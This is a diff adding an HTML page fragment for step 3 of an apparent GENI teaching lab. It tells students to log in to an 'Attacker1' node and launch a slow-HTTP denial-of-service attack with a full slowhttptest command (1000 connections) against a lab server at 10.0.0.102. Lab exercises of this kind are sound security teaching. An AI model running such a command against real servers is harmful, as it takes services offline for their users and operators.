@@ -1,0 +1,19 @@
+<div class="step-detail-title"> Step 3 - Launch DDoS attack </div>
+
+<div class="options list-group">
+    <a href="javascript:showStep('lab_step_3_1')" class="list-group-item list-group-item-success ">Launch the attack using slowhttptest </a>
+    <div class="lab-step-details" style="" id="lab_step_3_1">
+        <p>Login to Attacker1 Console via SSH using the GENI interface.
+			<br/>We can now launch the slowhttptest attack. Please execute the command below, replacing $server1IP with the IP address of server1
+        </p>
+        <div class="lab-code">
+            <p>slowhttptest -c 1000 -H -g -o slowhttp -r 200 -t GET -u http://$server1IP/ </p>
+		
+        </div>
+        <p><b>example : </b><i>slowhttptest -c 1000 -H -g -o slowhttp -r 200 -t  GET -u  http://10.0.0.102/ </i></p>
+    </div>
+    
+    
+</div>
+
+ 
